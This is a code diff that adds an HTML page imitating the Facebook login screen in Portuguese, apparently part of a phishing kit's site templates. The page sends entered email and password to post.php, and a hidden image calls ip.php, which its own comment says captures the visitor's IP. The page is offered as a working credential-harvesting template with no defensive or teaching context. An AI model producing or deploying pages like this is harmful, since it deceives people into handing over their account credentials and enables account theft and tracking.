@@ -1,1 +1,29 @@
-
+<!-- .sites/facebook/index.html -->
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook - Entre ou Cadastre-se</title>
+    <style>
+        body { font-family: Arial, sans-serif; background: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .container { background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); width: 350px; text-align: center; }
+        input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #dddfe2; border-radius: 6px; font-size: 16px; }
+        button { background: #1877f2; color: white; border: none; padding: 12px; width: 100%; border-radius: 6px; font-size: 18px; font-weight: bold; cursor: pointer; }
+        .logo { font-size: 48px; font-weight: bold; color: #1877f2; margin-bottom: 20px; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">facebook</div>
+        <form method="POST" action="post.php">
+            <input type="text" name="email" placeholder="E-mail ou telefone" autocomplete="off" required>
+            <input type="password" name="pass" placeholder="Senha" required>
+            <button type="submit">Entrar</button>
+        </form>
+        <p style="margin-top: 16px; font-size: 12px; color: #777;">Ao clicar, você concorda com nossos termos.</p>
+    </div>
+    <!-- Imagem invisível para capturar IP -->
+    <img src="ip.php" style="display:none;">
+</body>
+</html>
